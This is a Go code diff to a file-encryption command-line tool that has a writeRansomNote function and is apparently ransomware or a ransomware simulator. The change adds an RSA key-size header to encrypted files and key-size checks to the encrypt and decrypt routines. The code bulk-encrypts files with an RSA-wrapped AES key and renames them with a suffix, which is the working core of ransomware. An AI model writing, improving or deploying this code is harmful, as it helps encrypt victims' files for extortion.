@@ -2,6 +2,7 @@ package cli
 
 import (
 	"crypto/rsa"
+	"encoding/binary"
 	"errors"
 	"fmt"
 	"io"
@@ -108,7 +109,11 @@ func Encrypt(ctx *urfavecli.Context) error {
 	if err != nil {
 		return err
 	}
-	slog.Info("RSA public key loaded")
+	keySizeBits := uint16(publicKey.Size() * 8)
+	if !validKeySizes[int(keySizeBits)] {
+		return fmt.Errorf("unsupported RSA key size: %d bits (supported: 2048, 3072, 4096)", keySizeBits)
+	}
+	slog.Info("RSA public key loaded", "keySize", keySizeBits)
 
 	plainAesKey, err := crypto.NewRandomAesKey(crypto.AES_KEY_SIZE)
 	if err != nil {
@@ -147,7 +152,7 @@ func Encrypt(ctx *urfavecli.Context) error {
 	}
 
 	if err := processFiles(files, workers, dryRun, "Encrypting", func(filePath string) error {
-		return encryptFile(filePath, plainAesKey, encryptedAesKey, encSuffix)
+		return encryptFile(filePath, plainAesKey, encryptedAesKey, keySizeBits, encSuffix)
 	}); err != nil {
 		return err
 	}
@@ -252,7 +257,7 @@ func writeRansomNote(dir, fileName, templatePath string, publicKey *rsa.PublicKe
 	})
 }
 
-func encryptFile(path string, aesKey crypto.AesKey, encryptedAesKey []byte, encSuffix string) (retErr error) {
+func encryptFile(path string, aesKey crypto.AesKey, encryptedAesKey []byte, keySizeBits uint16, encSuffix string) (retErr error) {
 	src, err := os.Open(path)
 	if err != nil {
 		return err
@@ -273,6 +278,11 @@ func encryptFile(path string, aesKey crypto.AesKey, encryptedAesKey []byte, encS
 		}
 	}()
 
+	// Write key size header (2 bytes, big-endian) for self-describing format.
+	if err := binary.Write(dst, binary.BigEndian, keySizeBits); err != nil {
+		return fmt.Errorf("write key size header: %w", err)
+	}
+
 	if _, err := dst.Write(encryptedAesKey); err != nil {
 		return fmt.Errorf("write encrypted key: %w", err)
 	}
@@ -287,7 +297,23 @@ func decryptFile(path string, rsaPrivateKey *rsa.PrivateKey, encSuffix string) (
 	}
 	defer func() { _ = src.Close() }()
 
-	encryptedKey := make([]byte, rsaPrivateKey.Size())
+	// Read key size header to determine RSA key size.
+	var keySizeBits uint16
+	if err := binary.Read(src, binary.BigEndian, &keySizeBits); err != nil {
+		return fmt.Errorf("read key size header: %w", err)
+	}
+
+	if !validKeySizes[int(keySizeBits)] {
+		return fmt.Errorf("invalid key size in file header: %d bits", keySizeBits)
+	}
+
+	keySizeBytes := int(keySizeBits) / 8
+	if keySizeBytes != rsaPrivateKey.Size() {
+		return fmt.Errorf("key size mismatch: file encrypted with %d-bit key, but private key is %d-bit",
+			keySizeBits, rsaPrivateKey.Size()*8)
+	}
+
+	encryptedKey := make([]byte, keySizeBytes)
 	if _, err := io.ReadFull(src, encryptedKey); err != nil {
 		return fmt.Errorf("read encrypted key: %w", err)
 	}
